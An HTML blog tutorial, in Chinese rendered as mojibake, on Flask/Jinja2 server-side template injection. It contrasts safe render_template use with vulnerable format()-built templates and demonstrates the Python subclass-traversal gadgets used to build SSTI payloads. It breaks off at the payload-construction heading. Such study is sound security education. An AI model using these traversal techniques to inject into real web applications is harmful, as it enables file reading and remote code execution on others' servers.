title="flaskæ¨¡æ¿"></a>flaskæ¨¡æ¿</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ban</span>():</span><br><span class="line">    hello=<span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">    num=request.args.get(<span class="string">&#x27;num&#x27;</span>)<span class="comment">#è·å–getä¼ çš„numå‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,<span class="built_in">str</span>=hello,<span class="built_in">int</span>=num)<span class="comment">#å°†helloå’Œnumä¼ å…¥æ¨¡æ¿ä¸­</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; str &#125;&#125;<span class="tag">&lt;<span class="name">P</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span>&#123;&#123; int &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ä¹¦å†™çš„ä¾¿æ˜¯æ¨¡æ¿ï¼Œæ¨¡æ¿å°±æ˜¯æˆ‘ä»¬ä¸ªäººå†™åœ¨templatesæ–‡ä»¶å¤¹ä¸‹çš„htmlæ–‡ä»¶ã€‚æ‰€è°“æ¨¡æ¿å°±æ˜¯ä¸€ä¸ªhtmlæ–‡ä»¶å ä½ç¬¦ï¼Œå¯ä»¥ç›´æ¥å°†å‚æ•°ä¼ å…¥æ–‡ä»¶çš„å ä½ç¬¦é‡Œã€‚ä»¥è¾¾åˆ°åŠ¨æ€æ˜¾ç¤ºçš„ç›®çš„ã€‚<br>htmlæ–‡ä»¶å†…å†™çš„<code>&#123;&#123;int&#125;&#125;</code>å°±æ˜¯å ä½ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨render_templateå‘htmlä¼ å…¥å‚æ•°ã€‚ä¼ å…¥çš„å‚æ•°numæ˜¯ç”±getä¼ å…¥çš„æˆ‘ä»¬ä¼ å…¥çš„ä¸åŒè¾“å‡ºçš„ä¹Ÿä¸åŒã€‚</p><h2 id="flaskæ¨¡æ¿æ¼æ´"><a href="#flaskæ¨¡æ¿æ¼æ´" class="headerlink" title="flaskæ¨¡æ¿æ¼æ´"></a>flaskæ¨¡æ¿æ¼æ´</h2><p>æ¨¡æ¿æ³¨å…¥çš„æˆå› å’Œä¹‹å‰å­¦è¿‡çš„æ¼æ´æˆå› ç›¸ä¼¼éƒ½æ˜¯å› ä¸ºå…¶è¿‡æ»¤ä¸ä¸¥å¯¼è‡´çš„æ¼æ´ã€‚å…·ä½“å¦‚ä¸‹<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.png" class="" title="Alt text"><br>ä¸Šå›¾æ˜¯ä½¿ç”¨ä¸Šé¢çš„ä»£ç æ‰€è¿è¡Œçš„ç»“æœï¼Œåˆ©ç”¨çš„æ˜¯render_templasteå¯ä»¥çœ‹å‡ºæˆ‘ä»¬è¾“å…¥<code>1*1</code>è¾“å‡ºè¿˜æ˜¯<code>1*1</code>è¿™æ˜¯å› ä¸ºä¼šå…ˆå°†å†…éƒ¨çš„å˜é‡è¿›è¡Œé¢„æ¸²æŸ“ï¼Œä½¿å…¶å˜é‡æˆä¸ºå•çº¯çš„å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯è½¬ä¹‰äº†å¯¼è‡´å…¶å¤±å»äº†åŠŸèƒ½æ€§ï¼Œä¹Ÿå°±ä¸å­˜åœ¨sstiæ¼æ´ã€‚<br>ç”±äºä¸Šé¢çš„ä»£ç çš„htmlæ–‡ä»¶ä¸­å ä½ç¬¦éƒ½æ˜¯ç”±<code>&#123;&#123;&#125;&#125;</code>æ‰€åŒ…è£¹æ‰€ä»¥ä¿æŒåŸæ ·è¾“å‡ºã€‚<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/3.png" class="" title="Alt text"><br>è¿™ä¸ªä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä½¿ç”¨render_template_string()è¿™ä¸ªå‡½æ•°ä¸render_template()åœ¨åŠŸèƒ½ä¸Šç›¸å·®æ— å‡ åªæ˜¯render_template_string()è¿™ä¸ªå‡½æ•°æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†å­—ç¬¦ä¸²ä½œä¸ºæ¨¡æ¿æ¸²æŸ“ï¼Œè€Œrender_template()æ˜¯å°†æ–‡ä»¶ä½œä¸ºæ¨¡æ¿è¿›è¡Œæ¸²æŸ“ã€‚<br>ç”±äºå…¶ä¸render_template()æ— å¤ªå¤§å·®åˆ«æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„çœ‹å‡ºå…¶ä¹Ÿæœ¨æœ‰sstiæ¼æ´å› ä¸ºå…¶å ä½ç¬¦ä»æ˜¯ç”±<code>&#123;&#123;&#125;&#125;</code>æ¥åŒ…è£¹</p><p>ä¸‹é¢ä¸ºå‡ºç°æ¼æ´çš„ä»£ç <br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/4.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä½¿ç”¨<code>&#123;0&#125;åŠ ä¸Šformat()</code>æ¥è¿›è¡Œç›´æ¥æ’å…¥çš„è¿™æ ·å°±å¯¼è‡´äº†å…¶ä¸ä¼šè¿›è¡Œé¢„æ¸²æŸ“ï¼Œå°±ä¼šä½¿å…¶äº§ç”Ÿsstiæ¼æ´ã€‚<br>å½“æˆ‘ä»¬ä½¿ç”¨getä¼ å€¼ä¼ å…¥<code>&#123;&#123;1*1&#125;&#125;</code>æ˜¯å°±ä¼šè¿”å›1ã€‚æˆ‘ä»¬è¾“å…¥çš„<code>1*1</code>è¢«æ‰§è¡Œäº†ã€‚<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/6.png" class="" title="Alt text"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥è¾“å…¥JavaScriptçš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶ä¹Ÿå­˜åœ¨xssæ¼æ´<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/5.png" class="" title="Alt text"><br>å½“ç„¶xssæ¼æ´è¿˜ä¸æ˜¯é€ æˆå±å®³æœ€å¤§çš„ï¼Œè¿™ä¸ªsstiæ¼æ´è¿˜ä¼šè¢«åˆ©ç”¨ä¸ºä¿¡æ¯æ³„éœ²ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼ŒRCEç­‰æ¼æ´ï¼Œ</p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>Jinja2æ¨¡æ¿å¼•æ“ä¸­ä½¿ç”¨<code>&#123;&#123;&#125;&#125;</code>æ ‡è¯†ç¬¦åŒ…è£¹çš„å†…å®¹ä¼šè¢«è§£ææˆä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶ä¸”ä¼šåœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ±‚å€¼å’Œæ¸²æŸ“ã€‚å¦‚æœä½¿ç”¨<code>&#123;&#123;&#125;&#125;</code>ä¸­åŒ…å«çš„æ˜¯å¯æ‰§è¡Œçš„å‘½ä»¤è¯­å¥ï¼›æ­¤æ—¶è¿™ä¸ªå‘½ä»¤è¯­å¥ä¼šè¢«æ‰§è¡Œï¼›æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬åŠ ä¸Š<code>&#123;&#123;&#125;&#125;</code>æ ‡è¯†ç¬¦çš„ç›®çš„å°±æ˜¯ä¸ºäº†ä½¿å¾—è¢«<code>&#123;&#123;&#125;&#125;</code>åŒ…è£¹çš„å†…å®¹å½“ä½œå˜é‡æ¥è§£ææ›¿æ¢ã€‚</p><h2 id="çˆ¶ç±»ä¸å­ç±»"><a href="#çˆ¶ç±»ä¸å­ç±»" class="headerlink" title="çˆ¶ç±»ä¸å­ç±»"></a>çˆ¶ç±»ä¸å­ç±»</h2><p>æ‰€è°“çˆ¶ç±»å°±æ˜¯è¿™ä¸ªç±»çš„ä¸Šä¸€çº§è€Œå­ç±»å°±æ˜¯è¯¥ç±»çš„ä¸‹ä¸€çº§ï¼Œæ‰€ä»¥ç±»çš„çˆ¶ç±»ä¸æ–­çš„å‘ä¸Šæ‰¾çˆ¶ç±»æœ€ç»ˆä¼šæ‰¾åˆ°objectè¿™ä¸€ç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨objectçš„å­ç±»æ¥è¿›è¡Œæ“ä½œã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line">c=B()</span><br><span class="line">d=D()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment">#æŸ¥æ‰¾cçš„çˆ¶ç±»</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment">#æŸ¥æ‰¾cçˆ¶ç±»çš„çˆ¶ç±»</span></span><br><span class="line"><span class="built_in">print</span>(d.__class__.__mro__)<span class="comment">#ä¸æ–­æŸ¥æ‰¾cçš„çˆ¶ç±»ç›´åˆ°object</span></span><br><span class="line"><span class="built_in">print</span>(d.__class__.__mro__[<span class="number">3</span>])<span class="comment">#é€‰æ‹©æŸ¥æ‰¾çˆ¶ç±»ç»“æœçš„ç¬¬4ä¸ª</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__subclasses__())<span class="comment">#æŸ¥æ‰¾çˆ¶ç±»çš„çˆ¶ç±»ä¸‹çš„æ‰€æœ‰å­ç±»</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__subclasses__()[<span class="number">0</span>])<span class="comment">#é€‰æ‹©ç¬¬ä¸€ä¸ª</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line">&lt;class &#x27;__main__.A&#x27;&gt;</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;_contextvars.Token&#x27;&gt;, &lt;class &#x27;_contextvars.ContextVar&#x27;&gt;, &lt;class &#x27;_contextvars.Context&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;symtable entry&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;anext_awaitable&#x27;&gt;, &lt;class &#x27;async_generator_asend&#x27;&gt;, &lt;class &#x27;async_generator_athrow&#x27;&gt;, &lt;class &#x27;async_generator_wrapped_value&#x27;&gt;, &lt;class &#x27;_buffer_wrapper&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;generic_alias_iterator&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;sys.legacy_event_handler&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;line_iterator&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memory_iterator&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;positions_iterator&#x27;&gt;, &lt;class &#x27;str_ascii_iterator&#x27;&gt;, &lt;class &#x27;types.UnionType&#x27;&gt;, &lt;class &#x27;weakref.CallableProxyType&#x27;&gt;, &lt;class &#x27;weakref.ProxyType&#x27;&gt;, &lt;class &#x27;weakref.ReferenceType&#x27;&gt;, &lt;class &#x27;typing.TypeAliasType&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing.TypeVar&#x27;&gt;, &lt;class &#x27;typing.TypeVarTuple&#x27;&gt;, &lt;class &#x27;typing.ParamSpec&#x27;&gt;, &lt;class &#x27;typing.ParamSpecArgs&#x27;&gt;, &lt;class &#x27;typing.ParamSpecKwargs&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;_frozen_importlib._WeakValueDictionary&#x27;&gt;, &lt;class &#x27;_frozen_importlib._BlockingOnManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;winreg.PyHKEY&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Buffer&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;_winapi.Overlapped&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;os._AddedDllDirectory&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteCodec&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.batched&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.pairwise&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;collections._deque_iterator&#x27;&gt;, &lt;class &#x27;collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.KeyWrapper&#x27;&gt;, &lt;class &#x27;functools._lru_list_elem&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib.AsyncContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;_virtualenv._Finder&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;enum.nonmember&#x27;&gt;, &lt;class &#x27;enum.member&#x27;&gt;, &lt;class &#x27;enum._auto_null&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;class &#x27;enum._proto_member&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;enum.verify&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;_sre.SRE_Template&#x27;&gt;, &lt;class &#x27;re._parser.State&#x27;&gt;, &lt;class &#x27;re._parser.SubPattern&#x27;&gt;, &lt;class &#x27;re._parser.Tokenizer&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;_tokenize.TokenizerIter&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;textwrap.TextWrapper&#x27;&gt;, &lt;class &#x27;traceback._Sentinel&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback._ExceptionPrintContext&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;]</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__<span class="comment">#æŸ¥æ‰¾è¯¥ç±»ä¸ºä»€ä¹ˆ</span></span><br><span class="line">__base__<span class="comment">#æŸ¥æ‰¾è¯¥ç±»çš„çˆ¶ç±»</span></span><br><span class="line">__mro__<span class="comment">#ä¸æ–­æŸ¥æ‰¾çˆ¶ç±»ç›´åˆ°æŸ¥æ‰¾åˆ°objectä¸ºæ­¢</span></span><br><span class="line">__subclasses__()<span class="comment">#æŸ¥æ‰¾è¯¥ç±»ä¸‹çš„æ‰€æœ‰å­ç±»æˆ‘ä»¬å¯ä»¥åœ¨åé¢åŠ ä¸Š[index]é€šè¿‡æ”¹å˜indexçš„å‚æ•°æ¥æŸ¥æ‰¾å›ºå®šçš„ç±»</span></span><br><span class="line">__init__<span class="comment">#åˆå§‹åŒ–ç”¨äºå°†æŸ¥æ‰¾åˆ°objectä¸‹çš„å­ç±»æ¨¡æ¿åˆå§‹åŒ–</span></span><br><span class="line">__globals__<span class="comment">#ä»¥å­—å…¸çš„å½¢å¼è¿”å›æŸ¥è¯¢åˆ°çš„æ–¹æ³•çš„å±æ€§ç­‰ï¼Œå­—å…¸ç±»ä¼¼äºcçš„æ•°ç»„</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()æŸ¥çœ‹å½“å‰ç±»çš„å­ç±»ï¼Œæ ¼å¼å˜é‡.__class__.__bases__[0].__subclasses__()</span><br><span class="line">è¿™ä¸ªç±»ä¹Ÿå¯ä»¥åŠ æ•°ç»„æ¥æŸ¥çœ‹æŒ‡å®šçš„ç´¢å¼•å€¼ï¼Œä¾‹å¦‚å˜é‡.__class__.__bases__[0].__subclasses__()[1]</span><br></pre></td></tr></table></figure><h2 id="payloadæ„é€ æ­¥éª¤"><a href="#payloadæ„é€ æ­¥éª¤" class="headerlink" title="payloadæ„é€ æ­¥éª¤"></a>payloadæ„é€ æ­¥éª¤</h2><h3 id="1-å¯»æ‰¾å†…ç½®ç±»æ‰€å¯¹åº”çš„ç±»"><a href="#1-å¯»æ‰¾å†…ç½®ç±»æ‰€å¯¹åº”çš„ç±»" class="headerlink" 